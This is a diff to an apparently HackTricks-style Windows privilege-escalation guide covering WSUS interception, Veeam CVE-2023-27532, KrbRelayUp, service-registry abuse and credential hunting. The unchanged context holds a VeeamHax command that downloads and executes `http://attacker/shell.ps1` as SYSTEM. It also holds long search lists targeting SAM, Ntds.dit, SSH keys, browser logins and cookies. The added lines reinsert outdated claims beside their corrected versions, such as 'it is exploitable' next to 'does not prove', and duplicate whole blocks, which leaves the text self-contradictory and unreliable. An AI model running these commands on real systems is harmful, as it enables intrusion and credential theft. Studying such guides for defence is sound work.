@@ -98,6 +98,7 @@ This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for 
 - _post/windows/gather/enum_patches_
 - _post/multi/recon/local_exploit_suggester_
 - [_watson_](https://github.com/rasta-mouse/Watson)
+- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_
 - [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventories the OS build, installed updates, and selected advisory candidates; verify the exact product and superseding updates before treating a result as applicable.
 
 For a version-specific local exploit, check the **running process architecture** as well as the OS architecture. On 64-bit Windows, a 32-bit process is subject to [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` usually resolves to the 32-bit system directory, while `%windir%\Sysnative` gives that process access to the native system directory. The alias is unavailable to a 64-bit process. An OS build or missing-KB candidate does not prove exploitability; compare the running build, installed or superseding update, process architecture, and exploit prerequisites with the [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) for the exact issue.
@@ -208,6 +209,10 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 ## WSUS
 
+The earlier guidance summarized the risk as follows:
+
+You can compromise the system if the updates are not requested using http**S** but http.
+
 An HTTP WSUS endpoint is a review lead for update-metadata interception. Exploitation also depends on whether the client uses that WSUS server, whether an attacker can intercept or control its traffic, and the client's update trust and installation policy. The URL alone does not establish code execution. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).
 
 You start by checking if the network uses a non-SSL WSUS update by running the following in cmd:
@@ -238,6 +243,10 @@ PSProvider   : Microsoft.PowerShell.Core\Registry
 ```
 
 And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.
+
+The original applicability statement was:
+
+Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.
 
 When `UseWUServer` is `1`, the configured intranet service is used by Windows Update. This confirms a prerequisite for the HTTP interception path, but does not prove that interception, malicious-update acceptance, or elevated installation is possible. When it is `0`, this particular configured WSUS endpoint is not selected by that policy.
 
@@ -362,6 +371,12 @@ abusing-auto-updaters-and-ipc.md
 
 ## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)
 
+The original version-specific description and reconnaissance note were:
+
+Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>
+
+- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
+
 Veeam Backup & Replication and Cloud Connect use a core backup service on **TCP/9401 by default**. [Veeam's advisory](https://www.veeam.com/kb4424) describes unauthenticated disclosure of encrypted configuration-database credentials within the backup network perimeter; a separate public PoC demonstrates a command-execution path as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> The service may bind beyond localhost, so check its actual address and PID.
 
 - **Recon**: confirm that TCP/9401 belongs to `Veeam.Backup.Service.exe`, then inspect the installed product and patch metadata. `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` are clues, not a complete patch check.
@@ -372,8 +387,15 @@ Veeam Backup & Replication and Cloud Connect use a core backup service on **TCP/
 .\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
 ```
 
+The service executes the command as SYSTEM.
+
 The cited PoC demonstrates command execution as SYSTEM when its additional prerequisites hold; the vendor's advisory describes the credential-disclosure issue.
+
 ## KrbRelayUp
+
+The original default-environment description was:
+
+A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.
 
 A local Kerberos relay can cross from a lower-privileged logon to a privileged directory write when a suitable COM server authenticates and the relayed principal has rights on the target object. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) both RBCD and `msDS-KeyCredentialLink` (shadow-credential) LDAP writes; KrbRelayUp automates some of these paths. An RBCD chain requires applicable delegation and target-object rights, while a shadow-credential chain requires key-credential write rights and a KDC that supports the certificate authentication path. Neither path follows from domain membership alone.
 
@@ -841,6 +863,10 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
 
+The original permission test was stated as:
+
+It should be checked whether **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** possess `FullControl` permissions. If so, the binary executed by the service can be altered.
+
 Review whether **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have write-capable registry permissions on a particular service key. An ACL entry alone does not prove effective access: deny entries, the current token, and inherited permissions matter. Registry-key rights are separate from the service object's `SERVICE_CHANGE_CONFIG` and `SERVICE_START` rights. Escalation also requires a usable service configuration field, a way to trigger the service, and a more privileged service identity. See Microsoft's [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) and [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).
 
 To change the Path of the binary executed:
@@ -1052,6 +1078,10 @@ arbitrary-kernel-rw-token-theft.md
 
 {{#ref}}
 windows-kernel-rootkits-and-dkom.md
+{{#endref}}
+
+{{#ref}}
+kernel-mode-file-access-check-bypass.md
 {{#endref}}
 
 Related Windows kernel-exploitation material:
@@ -1481,6 +1511,8 @@ You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurls
 
 ### Sticky Notes
 
+People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.
+
 People sometimes save passwords and other information in sticky-note applications. Microsoft's packaged Sticky Notes app commonly stores notes at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; older or different apps may use other user-profile stores, including LevelDB. Identify the installed app and storage format before treating a missing SQLite file as absence of notes.
 
 If Sticky Notes is using SQLite write-ahead logging, a copy of `plum.sqlite` alone can omit recent committed notes. Keep the matching `plum.sqlite-wal` with a consistent copy of the database, and include `plum.sqlite-shm` when available; the shared-memory index can be rebuilt, but the WAL is part of the database's persistent state. See [SQLite's WAL documentation](https://www.sqlite.org/wal.html). A note containing an account name or password is only a credential lead: verify the account, permitted access, and password reuse separately. An encrypted password-manager record additionally requires its actual decryption key and application-specific interpretation before it can establish a higher-privilege login.
@@ -1905,6 +1937,72 @@ TypedURLs       #IE
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 ```
 
+#### Filename-list variant without the Password Safe extension
+
+```bash
+$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
+vnc.ini, ultravnc.ini, *vnc*
+web.config
+php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
+SiteList.xml #McAfee
+ConsoleHost_history.txt #PS-History
+*.gpg
+*.pgp
+*config*.php
+elasticsearch.y*ml
+kibana.y*ml
+*.p12
+*.der
+*.csr
+*.cer
+known_hosts
+id_rsa
+id_dsa
+*.ovpn
+anaconda-ks.cfg
+hostapd.conf
+rsyncd.conf
+cesi.conf
+supervisord.conf
+tomcat-users.xml
+*.kdbx
+KeePass.config
+Ntds.dit
+SAM
+SYSTEM
+FreeSSHDservice.ini
+access.log
+error.log
+server.xml
+ConsoleHost_history.txt
+setupinfo
+setupinfo.bak
+key3.db         #Firefox
+key4.db         #Firefox
+places.sqlite   #Firefox
+"Login Data"    #Chrome
+Cookies         #Chrome
+Bookmarks       #Chrome
+History         #Chrome
+TypedURLsTime   #IE
+TypedURLs       #IE
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+```
+
 Password Safe v3 databases commonly use the `.psafe3` extension. Treat a matching filename as an encrypted vault candidate; its presence does not establish that you can read it, unlock it, or use any stored credentials. Check accessible user profiles and configured file-sharing roots when reviewing where such files are stored.
 
 A readable KeePass `.kdbx` is likewise only an encrypted-vault lead. Unlocking it requires the actual master-password and any configured key-file or account factors. If an authorized review finds an LM:NT hash pair in an entry, verify the named account and whether the NT hash is current and accepted by the target's NTLM service before considering [pass-the-hash](../ntlm/README.md#pass-the-hash). A vault entry does not grant Administrator or SYSTEM rights on its own; remote service access, account rights, and any separate service-execution step must also hold. Inventory should report the vault path and readability, not print the database or stored credentials.
@@ -1916,11 +2014,20 @@ cd C:\
 dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
 ```
 
+#### Search-command variant without the Password Safe extension
+
+```
+cd C:\
+dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
+```
+
 ```
 Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
 ```
 
 ### Credentials in the RecycleBin
+
+You should also check the Bin to look for credentials inside it
 
 Check accessible Recycle Bin entries for deleted backups and configuration archives as well as files whose names explicitly mention credentials. A useful `.7z`, `.zip`, or `.rar` backup may be months old and have an ordinary filename. Windows stores the original path and deletion time in a `$I` record and the deleted file as its paired `$R` entry; inspect the metadata and the current identity's read access before opening an archive. Visibility depends on the volume, user SID, and file permissions, so an empty listing does not prove that no recoverable backup exists. Treat an archive name as a review candidate, not proof that it contains a valid secret.
 
@@ -1945,6 +2052,7 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 ### Browsers History
 
+You should check for dbs where passwords from **Chrome or Firefox** are stored.\
 You should check for dbs where passwords from **Chrome, Edge, or Firefox** are stored.\
 Also check for the history, bookmarks and favourites of the browsers so maybe some **passwords are** stored there.
 
